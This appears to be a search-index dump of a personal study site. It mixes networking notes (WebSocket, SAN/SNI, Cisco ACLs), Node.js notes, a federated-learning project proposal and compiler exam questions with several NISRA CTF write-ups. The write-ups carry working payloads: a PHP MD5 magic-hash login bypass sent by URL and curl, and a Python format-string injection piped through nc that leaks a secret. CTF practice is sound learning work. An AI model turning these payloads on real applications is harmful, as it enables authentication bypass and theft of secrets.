這是根據34所得到的結論，我自己的理解是socket本身就是一種\u0026quot;網路中\u0026quot;Process之間互相通訊的\u0026quot;介面\u0026quot;，而websocket則是實踐這個介面的\u0026quot;協定\u0026quot;，或者說實踐出來的一種方法\n![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLns0xTxSh_5JSboS3fbyfAwQVTCzd3YIbL5nDCfYQH4wWPW7ZbaOh7gsJ5wquyuX_Gcxj82ixLC0voY2MbYmOv0Lx_C6K-29lJB-VFZNG6x0Q0GBVbdiezOLPPFhsfXhUfNAyZt429eI/s320/222.png =200x)\nSocket簡單來說，就是以前的TCP/IP，實現繁瑣且困難，後來有人封裝成一個簡易的介面來讓開發人員使用。現在也變成通訊的標準之一。 Websocket，從字面上很容易就能理解。它是為了提升web通訊速度而被創造出來的一種「協議」，在七層模型中是屬於「應用層」它的原理是瀏覽器底層使用「socket」當作通訊介面，通訊協議才是採用它自身的「websocket協議」。可以想成，溝通的協議跟水管都裝在瀏覽器上。只要瀏覽器有支援，就可以使用這個協議透過web來跟伺服器做溝通。在前幾年可能會有很多瀏覽器不支援。但在現今，瀏覽器的版本都已經趨近成熟，大部分都支援websocket的協議。 在3有說明如何寫socket，以及更詳細的說明何為socket，有需要可以直接看內文的範例\n![](http://i.imgur.com/cqr4O2P.png =300x)\nWhat is Subject Alternative Name(SAN), Server Name Indication(SNI) # SAN # 資料來源: 使用 openssl 制作一個包含 SAN（Subject Alternative Name）的證書\nSAN(Subject Alternative Name) 是 SSL 標準 x509 中定義的一個擴展。使用了 SAN 字段的 SSL 證書，可以擴展此證書支持的域名，使得一個證書可以支持多個不同域名的解析。先來看一看 Google 是怎樣使用 SAN 證書的，下面是 Youtube 網站的證書信息： ![6363260315098898213519066](https://hackmd.io/_uploads/rkY-awtBR.png =400x) 這里可以看到這張證書的 Common Name 字段是 *.google.com，那麽為什麽這張證書卻能夠被 www.youtube.com 這個域名所使用呢。原因就是這是一張帶有 SAN 擴展的證書，下面是這張證書的 SAN 擴展信息： ![6363260315666115456453456](https://hackmd.io/_uploads/H1DfTwYHA.png =300x) ![6363260316281773611299520](https://hackmd.io/_uploads/SJmm6vKBA.png =300x) 這里可以看到，這張證書的 Subject Alternative Name 段中列了一大串的域名，因此這張證書能夠被多個域名所使用。對於 Google 這種域名數量較多的公司來說，使用這種類型的證書能夠極大的簡化網站證書的管理。\nSNI # 資料來源: Server Name Indication (SNI) 原理簡介\n如果你有接觸過 web server ，例如 apache 或是 nginx 或是 IIS，有個名詞叫做 virtual host 。意思是你可以在一台 web server 上面裝多個網站，可以讓 a.com 跟 b.com 對應到不同的處理邏輯。HTTP headers 裡面有個欄位叫做Host，會帶有 client 想要訪問的網站域名。 Server 可以根據這個訊息來判斷 client 到底想訪問 a.com 還是 b.com 。\nHTTPS 造成的問題 # HTTPS 把這件事變得有點麻煩。在 TCP 連線建立完成後，接著進行的是 TLS handshake ，這時候 Server 會需要回應一張證書給 client 。如果今天一個網站有一張以上的證書，事情就變得很麻煩，我到底要給哪一張。這時候沒辦法看 Host header ，原因是 TLS 會發生在 HTTP headers 訊息傳送之前。除非你可以預知未來，不然無法偷看到 Host header 。因此 SNI 要解決的問題，就是 server 不知道要給哪一張 certificate 的問題。SNI extensionSNI 是在 TLS handshake 的 client hello 規格部分加一個額外的欄位，裡面放的是 client 想訪問的域名。如此一來 server 就知道要回應哪一張證書了。 Access Control List(ACL) # 資料來源: 善用存取控制清單 Cisco網路設備變身防火牆\n眾所周知，防火牆可以透過設定來控制所通過的網路封包，以便於決定何種網路協定或何種埠的封包能夠通過，甚至可設定哪些來源端或目的地端套用這樣的設定。防火牆就是由許多這樣的規則所組成，以增加網路的安全性，而Cisco網路設備也可以提供這樣的功能，本文將示範如何設定Cisco路由器來當作網路防火牆。 為了讓Cisco路由器擁有如防火牆般的功能，最重要的技術就是透過Access Control List來完成。Access Control List簡稱ACL，可稱為存取控制清單。 簡單來說，存取控制清單包含一些規則，每一條規則可用來定義要允許或拒絕特定形式的網路封包，而這裡的特定形式，則包含網路協定的定義、來源端或目的地端的指定，或是埠的指定之類。接下來，說明Cisco路由器的存取控制清單的概念。\nReference # Debnath, J., Chau, S. Y., \u0026amp; Chowdhury, O. (2020). When tls meets proxy on mobile. In Applied Cryptography and Network Security: 18th International Conference, ACNS 2020, Rome, Italy, October 19–22, 2020, Proceedings, Part II 18 (pp. 387-407). Springer International Publishing.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSSH Tunneling (Port Forwarding) 詳解 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nTCP Socket Programming 學習筆記 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n【筆記】Socket，Websocket，Socket.io的差異 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":169,"href":"/security/practice/nisra/web/nisra---different-places/","title":"NISRA - different places","section":"Securities","content":" NISRA - different places # tags: NISRA CTF Web # Challenge: different places\nExploit - Integrate Fragments Flags # View Page Sources base64 decode dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE= $\\to$ username:admin_password:nisra\nObserve the form It uses get method to fetch the parameters. So we can peek login.php first. Then we could use the username and password we got at previous step. Payload: view-source:http://chall2.nisra.net:41025/login.php?username=admin\u0026amp;password=nisra Then we got the last fragment flag.\n:::spoiler Whole flag NISRA{KaN_y0u_fIND_FlA9_a7_dIff3R3n7_5Pac32} :::\n"},{"id":170,"href":"/security/practice/nisra/misc/nisra---hidden_/","title":"NISRA - Hidden?","section":"Securities","content":" NISRA - Hidden? # Background # advanced-potion-making:two::+1:\nRecon # 這一題也是蠻巧妙的，用pngcheck可以看到檔案有問題\n$ pngcheck haha.png haha.png additional data after IEND chunk ERROR: haha.png Exploit - Recover + Unzip # Recover PNG File 先找文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82） 發現後續還有其他bytes，用list signature追查後面是甚麼， 發現應該是個zip file，所以獨立出來後解壓縮\nUnzip 解壓縮後有一些文件，從裡面撈了一下flag就在./word/document.xml中 Flag: NISRA{Oop5!_yoU_fOuNd_1t}\n"},{"id":171,"href":"/security/practice/nisra/web/nisra---md5_1/","title":"NISRA - MD5_1","section":"Securities","content":" NISRA - MD5_1 # tags: NISRA CTF Web # Challenge: MD5_1\nSource code # \u0026lt;?php highlight_file(__FILE__); $FROM_INCLUDE = true; include(\u0026#34;flag.php\u0026#34;); $msg = \u0026#34;\u0026#34;; if (isset($_GET[\u0026#39;user\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;])) { $user = $_GET[\u0026#39;user\u0026#39;]; $password = $_GET[\u0026#39;password\u0026#39;]; $check = \u0026#34;QNKCDZO\u0026#34;; // the md5 of \u0026#34;QNKCDZO\u0026#34; is 0e830400451993494058024219903391 if ($user == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $password != $check \u0026amp;\u0026amp; md5($password) == md5($check)) { $msg = \u0026#34;Flag: \u0026#34;.$flag; } else { $msg = \u0026#34;Keep trying!\u0026#34;; } } echo $msg; ?\u0026gt; Exploit - MD5 Collision # Payload: http://chall2.nisra.net:41022/?user=admin\u0026amp;password=240610708 :::spoiler flag Flag: NISRA{PhP_is_th3_BeST_laNgUA9E} :::\nReference # md5(\u0026lsquo;240610708\u0026rsquo;) == md5(\u0026lsquo;QNKCDZO\u0026rsquo;)\n"},{"id":172,"href":"/security/practice/nisra/web/nisra---md5_2/","title":"NISRA - MD5_2","section":"Securities","content":" NISRA - MD5_2 # Exploit # Payload: curl http://chall2.nisra.net:41023/ -H \u0026quot;Content-Type: application/x-www-form-urlencoded\u0026quot; -X POST -d \u0026quot;user=240610708\u0026amp;password=QNKCDZO\u0026quot; Flag: NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}\nReference # md5(\u0026lsquo;240610708\u0026rsquo;) == md5(\u0026lsquo;QNKCDZO\u0026rsquo;)\n"},{"id":173,"href":"/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/","title":"NISRA 2023 Enlightened - Jack的flag","section":"Securities","content":" NISRA 2023 Enlightened - Jack的flag # Background # Microsoft Word Forensics\nRecon # 這是第一次寫到有關word的隱寫，蠻特別的就紀錄一下，但看得出來應該是考古古古古古古題了ㄅ\nExploit # 有兩種方法\n強制解壓縮 直接把副檔名改成.zip，然後用解壓縮軟體解壓縮，接著就可以在Final-Jack\\word\\document.xml中可以找到flag 把隱藏設定打開 直接在word中的檔案/選項/顯示/隱藏文字的方塊打勾，就可以直接在下面看到flag了 Flag: NISRA{Word'$_h1Dden_7eXT_reVEaLed}\n"},{"id":174,"href":"/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/","title":"NISRA 2023 Enlightened - Magic Function","section":"Securities","content":" NISRA 2023 Enlightened - Magic Function # Background # Magic Function of Python\nSource Code # class Test(): def __init__(self, email=\u0026#39;test@nisra.net\u0026#39;): self.info = \u0026#39;test\u0026#39; self.email = email class Secret(): flag = open(\u0026#34;./NISRA-Enlightened-2023/flag.txt\u0026#34;, \u0026#34;r\u0026#34;).read().strip() if __name__ == \u0026#39;__main__\u0026#39;: email = input(\u0026#39;Your email: \u0026#39;) if email: test = Test(email) else: test = Test() msg = (\u0026#39;this is for {test.info}, please contact \u0026#39; + email + \u0026#39;.\u0026#39;).format(test=test) print(msg) Recon # 這一題真的很有趣，但也是算通靈的奇淫怪招，仔細看了一下直覺應該是跟format string有關係，比賽的時候的確有想到，但我當時想的payload有點偏掉了，當時的payload是: {test.email}.format(test=Test(Secret().flag))，也就是先傳入Secret().flag給Test這個class，然後再利用format傳入給\nExploit # $ echo \u0026#34;{test.__init__.__globals__[Secret].flag}\u0026#34; | nc chall2.nisra.net 43001 Your email: this is for test, please contact NISRA{Ma9ic_pY3h0n_!!???}. Flag: NISRA{Ma9ic_pY3h0n_!!???}\n"},{"id":175,"href":"/security/practice/nisra/misc/nisra-2023-enlightened---pixel/","title":"NISRA 2023 Enlightened - Pixel","section":"Securities","content":" NISRA 2023 Enlightened - Pixel # Source Code # Recon # 這一題真的很難，應該說有想過，不過很麻煩就是了，每一個色塊都有一組RGB的數值，然後只要把它轉換成ASCII，再把每一個字元串起來，就會是一組base64的code，轉換之後就拿到一組ciphertext，接著就丟到cyberchef看看一般的工具可不可以解，最後是用rot13解出來，除了最一開始的地方需要一點通靈之外，其他都很簡單，但\u0026hellip;寫script頗麻煩\nExploit # from PIL import Image from base64 import b64decode img = Image.open(\u0026#34;./NISRA-Enlightened-2023/Misc/Final-Pixel.png\u0026#34;) pixels = [] for row in range(8):\t# 8 rows for col in range(8):\t# 8 columns r, g, b = img.getpixel((row * 64 + 1, col * 64 + 1))\t# each grid: 64 x 64 if r == 255 and g == 255 and b == 255: break else: pixels.append((chr(r), chr(g), chr(b))) if r == 255 and g == 255 and b == 255: break flag = \u0026#34;\u0026#34; print(pixels) for r, g, b in pixels: flag += r + g + b print(flag) print(b64decode(flag.encode())) $ python exp.py [(\u0026#39;c\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;l\u0026#39;), (\u0026#39;u\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;), (\u0026#39;o\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;Q\u0026#39;), (\u0026#39;V\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;G\u0026#39;), (\u0026#39;R\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;5\u0026#39;), (\u0026#39;7\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;l\u0026#39;), (\u0026#39;9\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;T\u0026#39;), (\u0026#39;m\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;3\u0026#39;), (\u0026#39;U\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;V\u0026#39;), (\u0026#39;f\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;k\u0026#39;), (\u0026#39;U\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;Q\u0026#39;), (\u0026#39;1\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;x\u0026#39;), (\u0026#39;U\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;9\u0026#39;), (\u0026#39;l\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;m\u0026#39;), (\u0026#39;N\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;U\u0026#39;), (\u0026#39;m\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;S\u0026#39;), (\u0026#39;Q\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;c\u0026#39;), (\u0026#39;k\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;0\u0026#39;), (\u0026#39;5\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;R\u0026#39;), (\u0026#39;2\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;w\u0026#39;), (\u0026#39;L\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;E\u0026#39;), (\u0026#39;x\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;j\u0026#39;), (\u0026#39;N\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;Z\u0026#39;), (\u0026#39;j\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;w\u0026#39;), (\u0026#39;Y\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;Q\u0026#39;), (\u0026#39;x\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;2\u0026#39;), (\u0026#39;N\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;c\u0026#39;), (\u0026#39;G\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;o\u0026#39;), (\u0026#39;R\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;J\u0026#39;), (\u0026#39;f\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;m\u0026#39;), (\u0026#39;Z\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;N\u0026#39;), (\u0026#39;F\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;l\u0026#39;), (\u0026#39;U\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;B\u0026#39;), (\u0026#39;H\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;m\u0026#39;), (\u0026#39;E\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;S\u0026#39;), (\u0026#39;D\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;O\u0026#39;), (\u0026#39;R\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;9\u0026#39;), (\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;j\u0026#39;), (\u0026#39;d\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;d\u0026#39;), (\u0026#39;m\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;f\u0026#39;), (\u0026#39;Y\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;V\u0026#39;), (\u0026#39;f\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;G\u0026#39;), (\u0026#39;V\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;c\u0026#39;), (\u0026#39;V\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;i\u0026#39;), (\u0026#39;U\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;9\u0026#39;), (\u0026#39;G\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;E\u0026#39;), (\u0026#39;h\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;Z\u0026#39;), (\u0026#39;V\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;f\u0026#39;), (\u0026#39;Q\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;Z\u0026#39;), (\u0026#39;L\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;n\u0026#39;), (\u0026#39;l\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;f\u0026#39;), (\u0026#39;Q\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;=\u0026#39;)] c3ludDogQVZGRU57Tl9lTmY3UkVfNkU0Q1UxUF9lUmNFUmZSQWckX05fR2owLVExWjNhZjEwYTQxX2N2cGdoRXJfTmZfNF9lUnBHbmE2SDFORV9abjdldmtfYmVfdGVWcV9iU19GZEhAZVJfQ1ZLcnlmfQ== b\u0026#39;synt: AVFEN{N_eNf7RE_6E4CU1P_eRcERfRAg$_N_Gj0-Q1Z3af10a41_cvpghEr_Nf_4_eRpGna6H1NE_Zn7evk_be_teVq_bS_FdH@eR_CVKryf}\u0026#39; Flag: NISRA{A_rAs7ER_6R4PH1C_rEpREsENt$_A_Tw0-D1M3ns10n41_pictuRe_As_4_rEcTan6U1AR_Ma7rix_or_grId_oF_SqU@rE_PIXels}\nReference # NISRA - Final WP\n"},{"id":176,"href":"/terminology/node-related/","title":"Node Related","section":"Terminologies","content":" Node Related # What is Node.JS # Node.js 是一個基於 Chrome V8 引擎的 JavaScript 運行環境，最初由 Ryan Dahl 於 2009 年開發，用於讓開發者在服務器端運行 JavaScript 代碼。它突破了 JavaScript 只能在瀏覽器端運行的限制，從而可以用 JavaScript 構建完整的後端應用。\nNode.js 的核心特點 # 事件驅動和非阻塞 I/O 模型：Node.js 采用事件驅動和非阻塞 I/O（異步 I/O）模型，這使得它非常適合處理高並發的網絡請求。它不會像傳統的阻塞 I/O 那樣等待數據返回，而是直接執行下一步操作，這大大提高了性能和效率。\n單線程架構：Node.js 使用單線程來處理所有請求。雖然這看似會限制並發性，但因為它的非阻塞 I/O 模型，這樣的架構仍然能高效處理大量請求。\n基於 V8 引擎：V8 是 Google 開發的一個非常快的 JavaScript 引擎，能夠將 JavaScript 編譯成高效的機器碼，顯著提高了 Node.js 的執行速度。\n豐富的包管理系統（npm）：Node.js 附帶 npm (Node Package Manager)，這是一個巨大的生態系統，提供了成千上萬的開源包，可以很方便地引入到項目中，快速實現各種功能。\nNode.js 的主要應用場景 # RESTful API 和微服務：Node.js 非常適合構建輕量、快速響應的 API 服務，可以和前端應用進行良好的交互。 實時應用：例如聊天應用、在線遊戲等，需要高頻交互的場景。 數據流處理：例如處理實時流數據的應用，可以通過 Node.js 輕松實現。 單頁應用（SPA）：Node.js 經常和前端框架（如 React、Angular、Vue）一起使用，構建單頁應用的後端。 Node.js 的優缺點 # 優點：\n速度快：由於 V8 引擎的優化以及非阻塞 I/O 模型，Node.js 運行速度很快。 大規模社區支持：擁有豐富的開源庫，極大提高了開發效率。 統一的開發語言：前端和後端都用 JavaScript，降低了全棧開發的門檻。 易於擴展：Node.js 支持擴展和插件，適用於不同的開發需求。 缺點：\n單線程限制：適合 I/O 密集型應用，但在處理 CPU 密集型任務時性能可能不如多線程語言。 異步代碼覆雜性：雖然異步操作可以提高效率，但大量嵌套的異步代碼（稱為“回調地獄”）可能使代碼難以維護。 總結 # Node.js 是一種非常流行的後端技術，特別適用於需要實時響應和高並發的應用。如果你的項目在效率、可擴展性和開發速度上有較高的要求，Node.js 是一個值得考慮的選擇。\nWhat is NVM \u0026amp; NPM? # NVM（Node Version Manager）和 NPM（Node Package Manager）是 Node.js 生態系統中的兩個重要工具，但它們的用途和功能完全不同：\n1. NVM（Node Version Manager） # 功能：管理和切換 Node.js 版本 主要用途：允許開發者安裝、管理、切換不同版本的 Node.js。\n工作原理：NVM 在系統中創建多個 Node.js 版本的獨立環境，通過命令來指定當前使用的版本。例如，開發者可以用 NVM 來切換項目的 Node.js 版本，以確保兼容性或滿足項目需求。\n使用場景：如果你在多個項目中工作，而這些項目依賴於不同版本的 Node.js，NVM 就非常有用。通過 NVM，可以避免因為版本不兼容而導致的錯誤。\n示例命令：\nnvm install \u0026lt;version\u0026gt;：安裝指定版本的 Node.js nvm use \u0026lt;version\u0026gt;：切換到指定的 Node.js 版本 nvm list：列出所有安裝的 Node.js 版本 2. NPM（Node Package Manager） # 功能：管理 Node.js 的包和依賴 主要用途：NPM 是 Node.js 的默認包管理工具，用來安裝、更新、卸載、發布和管理 Node.js 項目的依賴庫。\n工作原理：NPM 通過 package.json 文件來管理項目的依賴庫和版本。開發者可以通過 NPM 來安裝所需的第三方庫（如 Express、React 等），並在項目中使用。NPM 還負責依賴的版本控制，以確保不同庫之間的兼容性。\n使用場景：每當需要在項目中添加、更新或移除庫時，NPM 是不可或缺的。它還提供了工具來幫助管理依賴的版本。\n示例命令：\nnpm install \u0026lt;package\u0026gt;：安裝一個包 npm install：根據 package.json 文件安裝項目所有的依賴 npm update \u0026lt;package\u0026gt;：更新指定包 npm uninstall \u0026lt;package\u0026gt;：移除指定包 總結 # NVM：管理 Node.js 版本，幫助在項目間切換不同的 Node.js 運行環境。 NPM：管理項目中的包和依賴，用於安裝和管理第三方庫。 因此，NVM 主要幫助開發者管理 Node.js 的運行環境，而 NPM 負責管理 Node.js 應用的依賴包和庫。\n"},{"id":177,"href":"/security/course/ntu-cns/ntu-cns-final-project-proposal/","title":"NTU CNS Final Project Proposal","section":"Securities","content":" NTU CNS Final Project Proposal # tags: NTUCNS # Problem description / Research question(秉學) # Terminology # Federated Learning is a decentralized machine learning method that enables training models without exposing data. Traditional machine learning methods require all data to be centralized in one location for training, but Federated Learning enables models to be trained on many distributed devices, such as smartphones, tablets, or embedded devices, with each device training its own local data. This greatly reduces data transmission and storage requirements and better protects user privacy.\nPrivacy Preserving is a method of designing and implementing computing systems aimed at protecting the privacy of data and personal information. It is typically a technique used in the exchange or processing of data to ensure the confidentiality, integrity, and availability of data. Privacy preserving techniques can help ensure that data is protected and that sensitive information is not disclosed even during data sharing, analysis, or storage. For example, techniques such as data encryption, differential privacy, and multi-party computation can be used to protect data privacy, and these techniques have wide applications in data analysis and machine learning.\nResearch Problem # In this paper, they proposed a method to prevent a malicious server as an attacker as their threat model. However, each client in the same group shared the same public/private key so that the attacker can pretend a benign user and exploit part of the packages. So, our threat model is if the attacker is one of the user in a group, he can decrypt a part of the packages transferred in this group and the confidentiality property is gone.\nRelated work (馮楷) # FedML-HE:\nLimitations: Decentralized Threshold HE: The authors provided a $(t,n)$-theshold HE scheme based on CKKS HE scheme, where a center server is no longer needed for decryption. Instead, the decryption process can be done, when $t$ out of $n$ parties agree to decrypt.\nLimitations: To ensure the joint key security, smudging errors are required which inevitably enlarge the entire parameter size, resulting in a huge computational overhead. Proxy Re-Encryption: The scheme can re-encrypt ciphertext for multiple receivers at a time by generating the re-encryption key from private and other users\u0026rsquo; public identities, which meets the requirement of FL.\nLimitations: This scheme relies on a trusted authority KGC(key generation center) for initialization. Moreover, it assumes that all participants in the federated learning system are honest and follow the protocol correctly. Plan (智翔) # Our method would be mainly based on the general scheme proposed for the practical deployment of homomorphic-encryption-based federated learning [2]. Several security issues remain unsolved since the scheme aims to keep generality. We will apply two or more possible schemes to the general scheme to improve data security.\nKey management In the general scheme, there exists only one pair of public/private keys. Once a client is compromised or is malicious, they can easily decrypt the gradient from another client and possibly reverse the gradient to the original data using the gradient inversion attack. To defend against this type of attack, we may not allow clients to share the same pair of public/private keys. On the other hand, the key pair is published by a server. If the server is compromised or malicious, then gradients from clients can be decrypted. By the gradient inversion attack, local data can be reversed. Thus decentralization is important to any federated learning scheme. The following are two latest solutions to the problems.\nProxy re-encryption [4] This method establishes a key management held by a trusted third party and allows all clients to use distinct key pairs. The first problem is solved, while decentralization is not fulfilled. Threshold homomorphic encryption [3] This method establishes a decentralized scheme by using threshold cryptography. At the same time, a single client can not decrypt any gradient from another, which solves the first problem. Poisoning attack Poisoning attack is still one severe threat to federated learning. A malicious or compromised client can upload a bad gradient to the server and reduce the accuracy of the training model [5]. We will discuss this attack and try to find a scheme to mitigate poisoning attacks.\nComparison We will compare the security and efficiency of each scheme. For the security part, we will introduce several threats and evaluate the security level of a scheme by checking if the scheme can defend against these threats.\nTimeline (馮楷) # 5/8: Finish studying paper 5/15: Apply Decentralized Threshold HE on the FedML system 5/22: Apply Proxy Re-Encryption on the FedML system 5/29: Finish the report 6/5, 6/12: Oral Presentation\nDeliverables（歐華） # The final deliverable of this project will be a comprehensive analysis of the security vulnerabilities in the FedML-HE system, as well as enhancements through the addition of threshold homomorphic encryption and proxy re-encryption. These enhancements will be presented in a detailed report, as well as their potential benefits and limitations in a practical scenario.\nReference # Privacy Preserving using Homomorphic Encryption Privacy-Preserving Deep Learning via Additively Homomorphic Encryption FedML-HE: An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update ID-Based Multireceiver Homomorphic Proxy Re-Encryption in Federated Learning Poisoning Attacks and Defenses in Federated Learning: A Survey "},{"id":178,"href":"/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/","title":"NTU Compiler Technology Previous Exam 2019 Spring","section":"Securities","content":" NTU Compiler Technology Previous Exam 2019 Spring # tags: NTU_CT NTU Compiler Techonology of Programming Language Final Exam # Please explain three different compiler optimization techniques : (a) 1st compiler optimization technique: (5points/5) (b) 2nd compiler optimization technique: (5points/10) (c) 3rd compiler optimization techniques: (5points/15)\nMany computer systems provide an interactive debugger (for example, gdb or db x) to assist users in diagnosing and correcting runtime errors. Although a debugger is run long after a compiler has done its job, the two tools still must cooperate. What information (beyond the translation of a program) must a compiler supply to support effective runtime debugging? (5 points/20)\nSometimes it is necessary to modify the syntax of a programming language. This is done by changing the CFG that the language uses. Consider the CFG of the AC language in the class shown in the right . Please show how to change AC’s CFG to implement the if-then-else statement structure with unbounded structural induction? (10points/30) Please write regular expressions that define the strings recognized by the FA in the following. (5points/35) Please write a DFA recognizing the tokens defined by the following regular expression (5points/40) In Chapter 4, a bout the top down parsing technology, consider a non terminal A and a string $\\alpha$ of terminals and non terminals. (6a) Please explain First($\\alpha$) (2points/42) (6b) What is the use of First($\\alpha$) (3points/45) (6c) Please explain Follow(A) (2points/47) (6d) Please explain the use of Follow(A) (3points/50)\nConsider the grammar in the right Please explain why it cannot be parsed by LL(1) parser while can be by LL(2). (5 points 55) Please draw the CFSM of LR parsing for the grammar in the right. (10 points/65) The grammar in the right generates nested lists of numbers. Th e semantic actions are intended to count the number of elements just inside each parenthesized list. For each list found by Rule 2, Marker 44 prints out the number of elements found just inside the list. For example, the input ( ( 1 2 3 ) ( 1 2 3 4 5 6 )) should print 3, 6, and 2. The grammar uses a global variable count to determine the number o f elements in a list. P lease answer the following. (a) What is wrong with that approach? (5points/70) (b) Change the semantic actions so that the appropriate values are synthesized by the rules to allow counting without a global variable. (5points/75) Consider the program fragment in the right. The typedef establishes Pair as a typename, defined as a pointer to a record of two integers. The declaration for pairs uses the type name, but adds one more level of indirection to an array of 23 Pairs. P lease d raw a diagram of the symbol table entries, attribute descriptors, and type descriptors that would result from processing the declarations . (10 points /85) Assume we add a new option to C++ arrays that are heap allocated, the flex option. A flex array is automatically expanded in size if an index beyond the array’s current upper limit is accessed. Thus we might see:\n$ar = new flex int[10]; ar[20] = 10;$\nThe assignment to position 20 in ar forces an expansion of ar’s heap allocation. Explain what changes would be needed in array accessing to implement flex arrays. Especially, please explain w hat should happen if an array position beyond an array’s current upper limit is read rather than written? (5points/90)\nLocal variables are normally allocated within a frame, providing for automatic allocation and deallocation when a frame is pushed and popped. (a) Under what circumstance must a local variable be dynamically allocated? (4points/89) (b) Are there any advantages to allocating a local variable statically (i.e., giving it a single fixed address)? 3points/92) (c) Under what circumstances is static allocation for a local permissible? (3 points /95)\n"},{"id":179,"href":"/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/","title":"NTU Compiler Technology Previous Exam 2020 Spring","section":"Securities","content":" NTU Compiler Technology Previous Exam 2020 Spring # tags: NTU_CT NTU Compiler Techonology of Programming Language Final Exam # According to the grammar of AC in the right , please write down the recursive descent parsing procedure for nonterminal Expr. (10 points/10) Please write down a regular expression that defines the set of strings recognized by the FA in the following and explain your answer (5points/ 15) Please write down a DFA recognizing the tokens defined by the following regular expression and explain your answer (5 points/20) Please write down a regular expression that defines C-like comments delimited by /* and */. Individual *’s and /’s may appear in the comment body, but the pair */ may not. (5 points/ 25)\nConsider the ac grammar in question 1 . 5a. Please write down the value of First(Stmts)! ( 2 points/ 27) 5b. Please write down the value of First(Stmt)! ( 2 points/ 29) 5c. Please write down the value of First(Expr)! ( 2 points/ 31) 5d. Please write down the value of Follow(Stmts)! ( 2 points/ 33) 5e. Please write down the value of Follow(Expr)! ( 2 points/ 35)\nPlease explain the technology of recursive descent LL(1) parsers. There is no standard answer to this question. But the points you get depend on our evaluation of the depth of your correct understanding of the technology purely based on to your answer below. (10points/45)\nPlease write down a grammar that cannot be parsed by LL(0) while can be by LR(0) and explain why. (5points/50)\nPlease write down a grammar that cannot be parsed by LR(0) while can be by SLR(1) and explain why . (5points/ 55 )\nConsider the program fragment in the right. The typedef establishes Pair Name as a typename,defined as a pointer to a record of two integers with its name . The declaration for p p s uses the type name, but adds one more level of indirection to an array of $23x48$ PairNames. Please draw a diagram of the symbol table entries, attribute descriptors, and type descriptors that would result from processing the declarations.(10 points 65 )\nPlease explain the algorithm of Sethi-Ullman/Ershov Numbering for register allocation in compiler technology. (5point s /70)\nP lease writ e down an abstract syntax tree (AST) that needs 4 registers to calculate according to the Sethi-Ullman/Ershov Numbering algorithm. You need explain why 4 registers are needed.(5points/ 75)\nPlease explain GCD test in generating parallel machine code f or multi core machines .(5points/80)\nPlease explain the Virtual Assistant Programming Language (VAPL) ThingTalk in the Almond project of Stanford University. What are the new challenges in processing ThingTalk programs compared to traditional programming languages ? (Ref: Genie: A Generator of Natural Language Semantic Parsers for Virtual Assistant Commands ”, PLDI 2019) (5 points/ 85)\nPlease explain how compiler technology can help in pruning Convolutional 